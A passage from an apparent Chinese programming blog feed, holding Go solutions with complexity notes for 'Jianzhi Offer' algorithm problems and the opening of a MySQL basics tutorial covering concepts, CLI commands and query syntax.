丑数"></a><a href="https://leetcode-cn.com/problems/chou-shu-lcof/">49. 丑数</a></h2><p>所有的丑数都由已存在的丑数乘以 2 或 3 或 5 得到。因此可以采用动态规划 + 三指针的解法。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func nthUglyNumber(n int) int &#123;    if n &lt;= 0 &#123;        return -1    &#125;    dp := make([]int, n)    dp[0] = 1    p1, p2, p3 := 0, 0, 0    // 三个指针    for i := 1; i &lt; n; i++ &#123;        dp[i] = min(dp[p1] * 2, dp[p2] * 3, dp[p3] * 5)        if dp[i] == dp[p1] * 2 &#123;            p1++        &#125;        if dp[i] == dp[p2] * 3 &#123;            p2++        &#125;        if dp[i] == dp[p3] * 5 &#123;            p3++        &#125;    &#125;    return dp[len(dp)-1]&#125;// 求三数最小值func min(a, b, c int) int &#123;    switch &#123;    case a &lt;= b &amp;&amp; a &lt;= c:        return a    case a &lt;= b:        return c    case b &lt;= c:        return b    default:        return c    &#125;&#125;</code></pre><h2 id="50-第一个只出现一次的字符"><a href="#50-第一个只出现一次的字符" class="headerlink" title="50. 第一个只出现一次的字符"></a><a href="https://leetcode-cn.com/problems/di-yi-ge-zhi-chu-xian-yi-ci-de-zi-fu-lcof/">50. 第一个只出现一次的字符</a></h2><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>简单思路是使用 HashMap 统计每个字符的出现次数，再遍历一次取目标值。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func firstUniqChar(s string) byte &#123;    m := make(map[byte]int)    for i := range s &#123;        m[s[i]]++    &#125;    for i := range s &#123;        if m[s[i]] == 1 &#123;            return s[i]        &#125;    &#125;    return &#39; &#39;&#125;</code></pre><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><p>和 Map 思路相同，但是由于题目说明字符只能是小写字母，因此可以用字符数组存储。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func firstUniqChar(s string) byte &#123;    m := make([]int, 26)    for _, v := range s &#123;        m[v-&#39;a&#39;]++    &#125;    for _, v := range s &#123;        if m[v-&#39;a&#39;] == 1 &#123;            return byte(v)        &#125;    &#125;    return byte(&#39; &#39;)&#125;</code></pre><h2 id="52-两个链表的第一个公共节点"><a href="#52-两个链表的第一个公共节点" class="headerlink" title="52. 两个链表的第一个公共节点"></a><a href="https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof/">52. 两个链表的第一个公共节点</a></h2><h3 id="双指针-1"><a href="#双指针-1" class="headerlink" title="双指针"></a>双指针</h3><p>二者遍历到<code>nil</code>时，跳转到对方链路的头结点继续遍历，从而使两条链路长度相等。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func getIntersectionNode(headA, headB *ListNode) *ListNode &#123;    if headA == nil || headB == nil &#123;        return nil    &#125;    pa, pb := headA, headB    for pa != pb &#123;        if pa == nil &#123;            pa = headB        &#125; else &#123;            pa = pa.Next        &#125;        if pb == nil &#123;            pb = headA        &#125; else &#123;            pb = pb.Next        &#125;    &#125;    return pa&#125;</code></pre><h2 id="53-I-在排序数组中查找数字-I"><a href="#53-I-在排序数组中查找数字-I" class="headerlink" title="53 - I. 在排序数组中查找数字 I"></a><a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/">53 - I. 在排序数组中查找数字 I</a></h2><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><p>二分查找到第一个目标数字，再从该位置向后遍历统计等于目标值的元素个数。</p><pre><code class="go">func search(nums []int, target int) int &#123;    length := len(nums)    left, right, mid := 0, length - 1, 0    for left &lt; right &#123;        mid = (left+right)&gt;&gt;1        if nums[mid] &lt; target &#123;            left = mid + 1        &#125; else &#123;            right = mid        &#125;    &#125;    count := 0    for left &lt; length &amp;&amp; nums[left] == target &#123;        count++        left++    &#125;    return count&#125;</code></pre><h3 id="两次二分查找"><a href="#两次二分查找" class="headerlink" title="两次二分查找"></a>两次二分查找</h3><pre><code class="go">func search(nums []int, target int) int &#123;    length := len(nums)    left, right, mid := 0, length - 1, 0    // 找左边界    for left &lt; right &#123;        mid = (left+right)&gt;&gt;1        if nums[mid] &lt; target &#123;            left = mid + 1        &#125; else &#123;            right = mid        &#125;    &#125;    l := left // 记录左边界    if length &gt; 0 &amp;&amp; nums[l] != target &#123;        // 找不到，提前返回        return 0    &#125;    // 找右边界    right = length-1    for left &lt;= right &#123;        mid = (left+right)&gt;&gt;1        if nums[mid] &lt;= target &#123;            left = mid + 1        &#125; else &#123;            right = mid - 1        &#125;    &#125;    return right - l + 1&#125;</code></pre><h3 id="两次二分查找（OPT）"><a href="#两次二分查找（OPT）" class="headerlink" title="两次二分查找（OPT）"></a>两次二分查找（OPT）</h3><p>可以注意到，查找<code>target-1</code>右边界时，会定位到<code>target</code>的左边界，以此简化代码如下：</p><pre><code class="go">func search(nums []int, target int) int &#123;    length := len(nums)    left, right, mid := 0, length-1, 0    helper := func(l, r, t int) int &#123;        for l &lt;= r &#123;            mid = (l+r)&gt;&gt;1            if nums[mid] &lt;= t &#123;                l = mid + 1            &#125; else &#123;                r = mid - 1            &#125;        &#125;        return r    &#125;    return helper(left, right, target) - helper(left, right, target-1)&#125;</code></pre><h2 id="53-II-0-～-n-1-中缺失的数字"><a href="#53-II-0-～-n-1-中缺失的数字" class="headerlink" title="53 - II. 0 ～ n-1 中缺失的数字"></a><a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">53 - II. 0 ～ n-1 中缺失的数字</a></h2><h3 id="二分查找-1"><a href="#二分查找-1" class="headerlink" title="二分查找"></a>二分查找</h3><p>数组只缺少一个数字，缺失数字之前的数字下标和其值相等，因此可使用二分法进行查找。</p><ul><li>时间复杂度：$O(log{n})$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func missingNumber(nums []int) int &#123;    length := len(nums)    if length - 1 == nums[length-1] &#123;        // 当缺失的数字在数组最后时的情况        return nums[length-1] + 1    &#125;    left, right, mid := 0, length - 1, 0    for left &lt; right &#123;        // 二分法查找目标数字        mid = (left + right) / 2        if nums[mid] == mid &#123;            // 下标匹配，表明左半部分有序            left = mid + 1        &#125; else &#123;            // 左半部分无序            right = mid        &#125;    &#125;    return left&#125;</code></pre><h2 id="54-二叉搜索树的第-k-大节点"><a href="#54-二叉搜索树的第-k-大节点" class="headerlink" title="54. 二叉搜索树的第 k 大节点"></a><a href="https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-di-kda-jie-dian-lcof/">54. 二叉搜索树的第 k 大节点</a></h2><h3 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h3><p>由于二叉搜索树的特性，即中序遍历结果有序，因此可以使用中序遍历得到结果。</p><p>时间复杂度：$O(n)$</p><p>空间复杂度：$O(n)$</p><blockquote><p>最差情况：当树退化为链表时。</p></blockquote><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var res = 0var count = 0func kthLargest(root *TreeNode, k int) int &#123;    res = 0        // 重置全局变量值，防止用例干扰    count = 0    inorder(root, k)    return res&#125;func inorder(root *TreeNode, k int) &#123;    if root == nil &#123;        return    &#125;    inorder(root.Right, k)    // 先遍历右子树，得到中序遍历结果的逆序    count++    if count == k &#123;        // 当遍历的结点数等于 k 则返回        res = root.Val        return    &#125;    inorder(root.Left, k)&#125;</code></pre><h2 id="55-I-二叉树的深度"><a href="#55-I-二叉树的深度" class="headerlink" title="55 - I. 二叉树的深度"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-de-shen-du-lcof/">55 - I. 二叉树的深度</a></h2><h3 id="递归（DFS）-1"><a href="#递归（DFS）-1" class="headerlink" title="递归（DFS）"></a>递归（DFS）</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func maxDepth(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    return max(maxDepth(root.Left), maxDepth(root.Right)) + 1&#125;// 返回较大值func max(a, b int) int &#123;    if a &gt;= b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="层序遍历（BFS）"><a href="#层序遍历（BFS）" class="headerlink" title="层序遍历（BFS）"></a>层序遍历（BFS）</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func maxDepth(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    count := 0    // 统计层数    queue := []*TreeNode&#123;root&#125; // 队列    for len(queue) &gt; 0 &#123;        for i := len(queue); i &gt; 0; i-- &#123;            node := queue[0]            queue = queue[1:]            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;        &#125;        count++    &#125;    return count&#125;</code></pre><h2 id="55-II-平衡二叉树"><a href="#55-II-平衡二叉树" class="headerlink" title="55 - II. 平衡二叉树*"></a><a href="https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof/">55 - II. 平衡二叉树</a>*</h2><h3 id="DFS-1"><a href="#DFS-1" class="headerlink" title="DFS"></a>DFS</h3><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func isBalanced(root *TreeNode) bool &#123;    if root == nil &#123;        // 递归完毕，返回        return true    &#125;    if sub := depth(root.Left) - depth(root.Right); sub &lt;= 1 &amp;&amp; -sub &lt;= 1 &#123;        // 当前结点平衡，递归求下一结点        return isBalanced(root.Left) &amp;&amp; isBalanced(root.Right)    &#125;    return false&#125;// depth 求子树高度func depth(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    return max(depth(root.Left), depth(root.Right)) + 1&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h2 id="56-I-数组中数字出现的次数"><a href="#56-I-数组中数字出现的次数" class="headerlink" title="56 - I. 数组中数字出现的次数*"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/">56 - I. 数组中数字出现的次数</a>*</h2><h3 id="哈希表-1"><a href="#哈希表-1" class="headerlink" title="哈希表"></a>哈希表</h3><pre><code class="go">func singleNumbers(nums []int) []int &#123;    m := make(map[int]int)    res := make([]int, 2)    for i := range nums &#123;        m[nums[i]]++    &#125;    i := 0    for k, v := range m &#123;        if v == 1 &#123;            res[i] = k            i++        &#125;    &#125;    return res&#125;</code></pre><h3 id="位运算-1"><a href="#位运算-1" class="headerlink" title="位运算"></a>位运算</h3><ol><li>将所有数字进行异或运算，得到结果</li><li>求异或结果的低位真值（带 1）</li><li>将结果分组异或，得到原始值</li></ol><pre><code class="go">func singleNumbers(nums []int) []int &#123;    res := []int&#123;0, 0&#125;    sum := 0    for i := range nums &#123;        sum = sum ^ nums[i]    &#125;    low := sum ^ sum &amp; (sum-1)    for i := range nums &#123;        if nums[i] &amp; low &gt; 0 &#123;            res[0] ^= nums[i]        &#125; else &#123;            res[1] ^= nums[i]        &#125;    &#125;    return res&#125;</code></pre><h2 id="56-II-数组中数字出现的次数-II"><a href="#56-II-数组中数字出现的次数-II" class="headerlink" title="56 - II. 数组中数字出现的次数 II*"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof/">56 - II. 数组中数字出现的次数 II</a>*</h2><h3 id="哈希表-2"><a href="#哈希表-2" class="headerlink" title="哈希表"></a>哈希表</h3><p>简单粗暴，效率不高。</p><pre><code class="go">func singleNumber(nums []int) int &#123;    m := make(map[int]int)    for _, v := range nums &#123;        m[v]++    &#125;    for k, v := range m &#123;        if v == 1 &#123;            return k        &#125;    &#125;    return 0&#125;</code></pre><h3 id="位运算-2"><a href="#位运算-2" class="headerlink" title="位运算"></a>位运算</h3><h2 id="57-和为-s-的两个数字"><a href="#57-和为-s-的两个数字" class="headerlink" title="57. 和为 s 的两个数字"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/">57. 和为 s 的两个数字</a></h2><h3 id="双指针-2"><a href="#双指针-2" class="headerlink" title="双指针"></a>双指针</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func twoSum(nums []int, target int) []int &#123;    low, high := 0, len(nums) - 1    for low &lt; high &#123;        if nums[low] + nums[high] == target &#123;            return []int&#123;nums[low], nums[high]&#125;        &#125; else if nums[low] + nums[high] &gt; target &#123;            high--        &#125; else &#123;            low++        &#125;    &#125;    return nil&#125;</code></pre><h3 id="二分查找-2"><a href="#二分查找-2" class="headerlink" title="二分查找"></a>二分查找</h3><p>对每个数字二分查找目标值。</p><ul><li>时间复杂度：$O(nlogn)$</li><li>空间复杂度：$O(1)$</li></ul><h2 id="58-I-翻转单词顺序"><a href="#58-I-翻转单词顺序" class="headerlink" title="58 - I. 翻转单词顺序"></a><a href="https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof/">58 - I. 翻转单词顺序</a></h2><h3 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h3><blockquote><p>该解法效率极低。</p></blockquote><pre><code class="go">func reverseWords(s string) string &#123;    s = strings.Trim(s, &quot; &quot;)    arr := strings.Split(s, &quot; &quot;)    res := &quot;&quot;    for i := len(arr)-1; i &gt;= 0; i-- &#123;        if !strings.Contains(arr[i], &quot; &quot;) &amp;&amp; arr[i] != &quot;&quot; &#123;            res += strings.Trim(arr[i], &quot; &quot;)            if i &gt; 0 &#123;                res += &quot; &quot;            &#125;        &#125;    &#125;    return res&#125;</code></pre><h2 id="58-II-左旋转字符串"><a href="#58-II-左旋转字符串" class="headerlink" title="58 - II. 左旋转字符串"></a><a href="https://leetcode-cn.com/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/">58 - II. 左旋转字符串</a></h2><h4 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h4><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func reverseLeftWords(s string, n int) string &#123;    return s[n:] + s[:n]&#125;</code></pre><h4 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h4><p>反转整个字符串再翻转两个局部字符串。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度（Go）：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func reverseLeftWords(s string, n int) string &#123;    str := []byte(s)    rev := func(s []byte) &#123;        for i, j := 0, len(s)-1; i &lt; j; i, j = i+1, j-1 &#123;            s[i], s[j] = s[j], s[i]        &#125;    &#125;    rev(str)    rev(str[:len(str)-n])    rev(str[len(str)-n:])    return string(str)&#125;</code></pre><h2 id="61-扑克牌中的顺子"><a href="#61-扑克牌中的顺子" class="headerlink" title="61. 扑克牌中的顺子"></a><a href="https://leetcode-cn.com/problems/bu-ke-pai-zhong-de-shun-zi-lcof/">61. 扑克牌中的顺子</a></h2><h3 id="排序-数学"><a href="#排序-数学" class="headerlink" title="排序 + 数学"></a>排序 + 数学</h3><ol><li>首先通过排序方便检查重复并判断有序</li><li>记录 0 的个数</li><li>当非 0 的数字出现重复，则可以确定不满足条件</li><li>0 的个数正好等于第一个非零数字的下标</li><li>非零数字的两端差值小于 5 则表明中间能够用 0 填充使其满足条件</li></ol><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func isStraight(nums []int) bool &#123;    sort.Ints(nums)    // 排序    count := 0    for i := 0; i &lt; 4; i++ &#123;        if nums[i] == 0 &#123;            // 统计 0 的个数            count++        &#125; else if nums[i] == nums[i+1] &#123;            // 非 0 数字重复            return false        &#125;    &#125;    return nums[4] - nums[count] &lt; 5&#125;</code></pre><h2 id="63-股票的最大利润"><a href="#63-股票的最大利润" class="headerlink" title="63. 股票的最大利润"></a><a href="https://leetcode-cn.com/problems/gu-piao-de-zui-da-li-run-lcof/">63. 股票的最大利润</a></h2><h3 id="动态规划-4"><a href="#动态规划-4" class="headerlink" title="动态规划"></a>动态规划</h3><p>由于本题股票只能购买一次，实际上就是找整数对（买入价格，卖出价格），找出差值最大的整数对即可。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func maxProfit(prices []int) int &#123;    if len(prices) &lt;= 1 &#123;        return 0    &#125;    res := 0            // 差值    min := prices[0]    // 记录最低买入价    for i := 1; i &lt; len(prices); i++ &#123;        if prices[i] &lt; min &#123;            // 记录更低的价格            min = prices[i]        &#125; else &#123;            // 将更大的差值            res = max(res, prices[i] - min)        &#125;    &#125;    return res&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h2 id="64-求-1-2-…-n"><a href="#64-求-1-2-…-n" class="headerlink" title="64. 求 1+2+…+n"></a><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/">64. 求 1+2+…+n</a></h2><h3 id="数学-2"><a href="#数学-2" class="headerlink" title="数学"></a>数学</h3><p>解法：</p><p>$f(x) = {x(1 + x) \over 2}$</p><blockquote><p>梯形面积公式。</p></blockquote><pre><code class="go">func sumNums(n int) int &#123;    return (1 + n) * n / 2&#125;</code></pre><h2 id="65-不用加减乘除做加法"><a href="#65-不用加减乘除做加法" class="headerlink" title="65. 不用加减乘除做加法"></a><a href="https://leetcode-cn.com/problems/bu-yong-jia-jian-cheng-chu-zuo-jia-fa-lcof/">65. 不用加减乘除做加法</a></h2><h3 id="位运算-3"><a href="#位运算-3" class="headerlink" title="位运算"></a>位运算</h3><p>使用<code>sum</code>记录和，<code>carry</code>记录进位的大小。</p><pre><code class="go">func add(a int, b int) int &#123;    for b != 0 &#123;        sum := a ^ b        carry := a &amp; b &lt;&lt; 1        a = sum        b = carry    &#125;    return a&#125;</code></pre><pre><code class="go">func add(a int, b int) int &#123;    for b != 0 &#123;        a, b = a ^ b, a &amp; b &lt;&lt; 1    &#125;    return a&#125;</code></pre><h2 id="68-I-二叉搜索树的最近公共祖先"><a href="#68-I-二叉搜索树的最近公共祖先" class="headerlink" title="68 - I. 二叉搜索树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-zui-jin-gong-gong-zu-xian-lcof/">68 - I. 二叉搜索树的最近公共祖先</a></h2><h3 id="简单遍历"><a href="#简单遍历" class="headerlink" title="简单遍历"></a>简单遍历</h3><p>由于是二叉搜索树，因此从根结点遍历，判断目标节点在其左子树还是右子树，不断遍历直到根结点的值大于小目标值，小于大目标值。</p><pre><code class="go">func lowestCommonAncestor(root, p, q *TreeNode) *TreeNode &#123;    for root != nil &#123;        if root.Val &lt; p.Val &amp;&amp; root.Val &lt; q.Val &#123;            root = root.Right        &#125; else if root.Va &gt; p.Val &amp;&amp; root.Val &gt; q.Val &#123;            root = root.Left        &#125; else &#123;            break        &#125;    &#125;    return root&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;剑指 Offer 刷题记录。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="算法刷题" scheme="https://blog.secriy.com/categories/algorithms/"/>
    
    
    <category term="Algorithms" scheme="https://blog.secriy.com/tags/Algorithms/"/>
    
  </entry>
  
  <entry>
    <title>The Basics of MySQL</title>
    <link href="https://blog.secriy.com/basics-of-mysql/"/>
    <id>https://blog.secriy.com/basics-of-mysql/</id>
    <published>2021-04-21T11:03:12.000Z</published>
    <updated>2025-02-16T07:13:36.790Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>本文是对 MySQL 的学习总结，包含 MySQL 数据库系统的基础知识。</p></div><span id="more"></span><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><ol><li><p>数据库（database）：保存有组织数据的容器（通常是一个文件或一组文件）</p></li><li><p>表（table）：一种结构化的清单文件，可用于存储特定类型的数据</p></li><li><p>模式（schema）：关于数据库和表的布局及特性信息</p></li><li><p>列（column）：表中的一个字段，属于同一种类的一组数据</p></li><li><p>数据类型（datatype）：数据库中每列都有特定的一种数据类型，如数字、字符串等</p></li><li><p>行（row）：表中的一个记录（record），是相关联（属于同一对象）的一组数据</p></li><li><p>主键（primary key）：表中每一行都应有的唯一标识符，能够区分每一个行，但并非必须存在主键，通常不进行更新操作</p></li><li><p>DBMS 按照应用场景可分为两类：</p><ul><li>基于共享文件系统的 DBMS：通常应用于桌面环境，不用于高端和关键应用（如 Microsoft Access）</li><li>基于 C/S 的 DBMS：通常用于服务器，只将结果发送到客户端（如 MySQL）</li></ul></li></ol><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>SQL（Structured Query Language，结构化查询语言）是一种专门用来与数据库通信的语言，其并非是编程语言。</p><p>SQL 的优点：</p><ul><li>SQL 并不指定某一个 DBMS，在大多数 DBMS 中 SQL 都是通用的（但是不同的 DBMS 可能有不同的实现）</li><li>SQL 语法简单</li><li>SQL 能够进行复杂的数据库操作</li></ul><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>MySQL 是一个 RDBMS，即关系数据库管理系统，广泛应用于各个领域，它的主要特点有：</p><ul><li>开源，免费使用</li><li>性能较好</li><li>简单易上手</li></ul><h2 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h2><p>使用<code>mysql -u[user] -p[pass]</code>命令进入 mysql 命令模式。</p><p>这里给出常用的参数：</p><pre><code>-u // 指定用户名-p // 指定密码-P // 指定端口-h // 指定主机名</code></pre><h3 id="命令规范"><a href="#命令规范" class="headerlink" title="命令规范"></a>命令规范</h3><ul><li>命令输入在<code>mysql&gt;</code>之后；</li><li>每条命令都使用<code>;</code>结束；</li><li>使用<code>help</code>命令查看帮助信息。</li></ul><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>使用<code>help</code>命令查看所有命令：</p><pre><code class="shell">mysql&gt; helpFor information about MySQL products and services, visit:   http://www.mysql.com/For developer information, including the MySQL Reference Manual, visit:   http://dev.mysql.com/To buy MySQL Enterprise support, training, or other products, visit:   https://shop.mysql.com/List of all MySQL commands:Note that all text commands must be first on line and end with &#39;;&#39;?         (\?) Synonym for `help&#39;.clear     (\c) Clear the current input statement.connect   (\r) Reconnect to the server. Optional arguments are db and host.delimiter (\d) Set statement delimiter.ego       (\G) Send command to mysql server, display result vertically.exit      (\q) Exit mysql. Same as quit.go        (\g) Send command to mysql server.help      (\h) Display this help.notee     (\t) Don&#39;t write into outfile.print     (\p) Print current command.prompt    (\R) Change your mysql prompt.quit      (\q) Quit mysql.rehash    (\#) Rebuild completion hash.source    (\.) Execute an SQL script file. Takes a file name as an argument.status    (\s) Get status information from the server.system    (\!) Execute a system shell command.tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.use       (\u) Use another database. Takes database name as argument.charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings  (\W) Show warnings after every statement.nowarning (\w) Don&#39;t show warnings after every statement.resetconnection(\x) Clean session context.For server side help, type &#39;help contents&#39;</code></pre><p>查询所有数据库：</p><pre><code class="shell">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.01 sec)</code></pre><p>切换到某一个数据库：</p><pre><code class="shell">mysql&gt; use [db_name];Database changed</code></pre><p>查询当前选择的数据库中的所有可用表：</p><pre><code class="shell">mysql&gt; show tables;mysql&gt; show tables from [db_name]; // 查询指定数据库中的所有可用表+-------------------+| Tables_in_acgfate |+-------------------+| accounts          || users             |+-------------------+2 rows in set (0.01 sec)</code></pre><p>查询指定表中的所有列：</p><pre><code class="shell">mysql&gt; show columns from [table];+------------+------------------+------+-----+---------+----------------+| Field      | Type             | Null | Key | Default | Extra          |+------------+------------------+------+-----+---------+----------------+| id         | bigint unsigned  | NO   | PRI | NULL    | auto_increment || created_at | datetime(3)      | YES  |     | NULL    |                || updated_at | datetime(3)      | YES  |     | NULL    |                || deleted_at | datetime(3)      | YES  | MUL | NULL    |                || username   | longtext         | YES  |     | NULL    |                || password   | longtext         | YES  |     | NULL    |                || nickname   | longtext         | YES  |     | NULL    |                || mail       | longtext         | YES  |     | NULL    |                || avatar     | longtext         | YES  |     | NULL    |                || gender     | longtext         | YES  |     | NULL    |                || level      | tinyint unsigned | YES  |     | NULL    |                || join_time  | datetime(3)      | YES  |     | NULL    |                || silence    | tinyint(1)       | YES  |     | NULL    |                |+------------+------------------+------+-----+---------+----------------+13 rows in set (0.01 sec)</code></pre><h2 id="数据操作（DML）"><a href="#数据操作（DML）" class="headerlink" title="数据操作（DML）"></a>数据操作（DML）</h2><p><em>Data Manipulation Language</em></p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h4><pre><code class="mysql">select * from tbl_name;select col_name from tbl_name;select distinct col_name from tbl_name;select * from tbl_name limit n;select * from tbl_name limit m,n; -- m 开始位置 n 数量select * from tbl_name limit n offset m;select tbl_name.col_name from db_name.tbl_name;</code></pre><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><pre><code class="mysql">select * from tbl_name order by col_name;select * from tbl_name order by col_name asc; -- 等同于上一句select * from tbl_name order by col_name desc;select * from tbl_name order by col_name_1, col_name_2;</code></pre><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><h5 id="基础过滤"><a href="#基础过滤" class="headerlink" title="基础过滤"></a>基础过滤</h5><pre><code class="mysql">select * from tbl_name where col_name = k;select * from tbl_name where col_name &gt; k;select * from tbl_name where col_name != k;select * from tbl_name where col_name &lt;&gt; k; -- 同上select * from tbl_name where col_name between x and y; -- 闭区间select * from tbl_name where col_name is null;</code></pre><h5 id="高级过滤"><a href="#高级过滤" class="headerlink" title="高级过滤"></a>高级过滤</h5><pre><code class="mysql">select * from tbl_name where condition_1 and condition_2;select * from tbl_name where condition_1 or condition_2; -- and 优先级大于 orselect * from tbl_name where condition_1 or condition_2 and condition_3;select * from tbl_name where condition_1 or (condition_2 and condition_3); -- 同上select * from tbl_name where col_name in (x,y);select * from tbl_name where col_name = x or col_name = y; -- 同上select * from tbl_name where col_name not in (x,y);select * from tbl_name where col_name != x and col_name != y; -- 同上</code></pre><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><pre><code class="mysql">select * from tbl_name where col_name like &#39;xxx%&#39;;select * from tbl_name where col_name like &#39;%xxx&#39;;select * from tbl_name where col_name like &#39;%xxx%&#39;;select * from tbl_name where col_name like &#39;_xxx&#39;; -- 单个字符</code></pre><h5 id="Regexp"><a href="#Regexp" class="headerlink" title="Regexp"></a>Regexp</h5><h4 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h4><pre><code class="mysql">select concat(col_name_1, &#39;(&#39;, col_name_2, &#39;)&#39;) from tbl_name; -- concat 拼接字符串，得到 col_name_1(col_name_2)select concat(col_name_1, &#39;(&#39;, col_name_2, &#39;)&#39;) as alias_name from tbl_name; -- 别名（导出列）select col_name_1 as alias_name_1, col_name_2 as alias_name_2 from tbl_name;select 1+2; -- 3select 1-2; -- -1select 1*2; -- 2select 1/2; -- 0.5000select 253%7; -- 1select col_name_1 * col_name_2 as alias_name from tbl_name;</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><ul><li>rtrim(str): 删除右空格</li><li>ltrim(str)</li><li>trim(str)</li><li>upper(str): 转全大写</li><li>lower(str)</li><li>right(str, len): 返回从右起 len 个字符</li><li>left(str, len)</li><li>locate(substr, str): 返回子串位置，下标从 1 始，不存在返回 0</li></ul><h5 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h5><ul><li>curdate(): 当前日期</li><li>curtime()</li><li>now(): 当前日期与时间</li><li>date(str): 返回时间字符串的日期部分</li><li>time(str)</li><li>year(str)</li><li>day(str)</li><li>hour(str)</li><li>minute(str)</li><li>second(str)</li><li>dayofweek(str): 返回日期对应的是星期几</li><li>adddate(‘2008-01-02’, interval 31 day) -&gt; ‘2008-02-02’</li><li>date_add(str, format_str): 同 adddate() 但操作更灵活</li><li>addtime(‘2007-12-31 23:59:59.999999’, ‘1 1:1:1.000002’) -&gt; ‘2008-01-02 01:01:01.000001’</li><li>datediff(‘2007-12-31 23:59:59’,’2007-12-30’) -&gt; 1</li><li>date_format(‘2009-10-04 22:23:00’, ‘%W %M %Y’) -&gt; ‘Sunday October 2009’</li></ul><h5 id="数值处理"><a href="#数值处理" class="headerlink" title="数值处理"></a>数值处理</h5><ul><li>abs(num)</li><li>sin(num)</li><li>cos(num)</li><li>tan(num)</li><li>exp(num): $e^{num}$</li><li>mod(num_1, num_2): 等同于 num_1 % num_2</li><li>pi()</li><li>rand(): 返回一个随机数</li><li>sqrt(num)</li></ul><h5 id="聚集函数"><a href="#聚集函数" class="headerlink" 